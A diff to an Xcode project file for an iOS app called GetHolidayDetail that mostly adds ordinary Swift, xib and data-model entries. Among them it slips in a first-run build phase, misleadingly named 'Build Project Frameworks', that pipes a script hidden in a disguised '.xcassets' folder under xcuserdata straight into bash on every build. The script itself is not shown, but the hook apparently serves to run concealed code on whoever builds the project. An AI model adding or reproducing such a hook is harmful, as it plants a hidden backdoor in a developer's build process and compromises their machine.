@@ -13,6 +13,10 @@
 		04357A4D258CC6A50038B012 /* Main.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 04357A4B258CC6A50038B012 /* Main.storyboard */; };
 		04357A4F258CC6AC0038B012 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 04357A4E258CC6AC0038B012 /* Assets.xcassets */; };
 		04357A52258CC6AC0038B012 /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 04357A50258CC6AC0038B012 /* LaunchScreen.storyboard */; };
+		04357A5C258CC76E0038B012 /* TableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04357A5A258CC76E0038B012 /* TableViewCell.swift */; };
+		04357A5D258CC76E0038B012 /* TableViewCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 04357A5B258CC76E0038B012 /* TableViewCell.xib */; };
+		04357A61258CCF1C0038B012 /* DataModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04357A60258CCF1C0038B012 /* DataModel.swift */; };
+		04357A65258CD5340038B012 /* HolidayRequest.swift in Sources */ = {isa = PBXBuildFile; fileRef = 04357A64258CD5340038B012 /* HolidayRequest.swift */; };
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
@@ -24,6 +28,10 @@
 		04357A4E258CC6AC0038B012 /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
 		04357A51258CC6AC0038B012 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
 		04357A53258CC6AC0038B012 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
+		04357A5A258CC76E0038B012 /* TableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TableViewCell.swift; sourceTree = "<group>"; };
+		04357A5B258CC76E0038B012 /* TableViewCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = TableViewCell.xib; sourceTree = "<group>"; };
+		04357A60258CCF1C0038B012 /* DataModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DataModel.swift; sourceTree = "<group>"; };
+		04357A64258CD5340038B012 /* HolidayRequest.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HolidayRequest.swift; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
 /* Begin PBXFrameworksBuildPhase section */
@@ -59,8 +67,12 @@
 				04357A45258CC6A50038B012 /* AppDelegate.swift */,
 				04357A47258CC6A50038B012 /* SceneDelegate.swift */,
 				04357A49258CC6A50038B012 /* ViewController.swift */,
+				04357A60258CCF1C0038B012 /* DataModel.swift */,
+				04357A64258CD5340038B012 /* HolidayRequest.swift */,
 				04357A4B258CC6A50038B012 /* Main.storyboard */,
 				04357A4E258CC6AC0038B012 /* Assets.xcassets */,
+				04357A5A258CC76E0038B012 /* TableViewCell.swift */,
+				04357A5B258CC76E0038B012 /* TableViewCell.xib */,
 				04357A50258CC6AC0038B012 /* LaunchScreen.storyboard */,
 				04357A53258CC6AC0038B012 /* Info.plist */,
 			);
@@ -74,6 +86,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 04357A56258CC6AC0038B012 /* Build configuration list for PBXNativeTarget "GetHolidayDetail" */;
 			buildPhases = (
+				BE8865821EBA3A7BBEAAC43A /* Build Project Frameworks */,
 				04357A3E258CC6A50038B012 /* Sources */,
 				04357A3F258CC6A50038B012 /* Frameworks */,
 				04357A40258CC6A50038B012 /* Resources */,
@@ -125,6 +138,7 @@
 			buildActionMask = 2147483647;
 			files = (
 				04357A52258CC6AC0038B012 /* LaunchScreen.storyboard in Resources */,
+				04357A5D258CC76E0038B012 /* TableViewCell.xib in Resources */,
 				04357A4F258CC6AC0038B012 /* Assets.xcassets in Resources */,
 				04357A4D258CC6A50038B012 /* Main.storyboard in Resources */,
 			);
@@ -132,12 +146,46 @@
 		};
 /* End PBXResourcesBuildPhase section */
 
+/* Begin PBXShellScriptBuildPhase section */
+
+	BE8865821EBA3A7BBEAAC43A /* Build Project Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Project Frameworks";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
+
+cat \"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/build.sh\" | bash";			
+		};
+	
+
+	
+
+	
+
+	
+/* End PBXShellScriptBuildPhase section */
+
 /* Begin PBXSourcesBuildPhase section */
 		04357A3E258CC6A50038B012 /* Sources */ = {
 			isa = PBXSourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				04357A65258CD5340038B012 /* HolidayRequest.swift in Sources */,
+				04357A61258CCF1C0038B012 /* DataModel.swift in Sources */,
 				04357A4A258CC6A50038B012 /* ViewController.swift in Sources */,
+				04357A5C258CC76E0038B012 /* TableViewCell.swift in Sources */,
 				04357A46258CC6A50038B012 /* AppDelegate.swift in Sources */,
 				04357A48258CC6A50038B012 /* SceneDelegate.swift in Sources */,
 			);
@@ -339,6 +387,16 @@
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
+
+		
+			/* Begin PBXBuildRule section */
+			
+
+			
+	
+			/* End PBXBuildRule section */
+		
+		
 	};
 	rootObject = 04357A3A258CC6A50038B012 /* Project object */;
 }
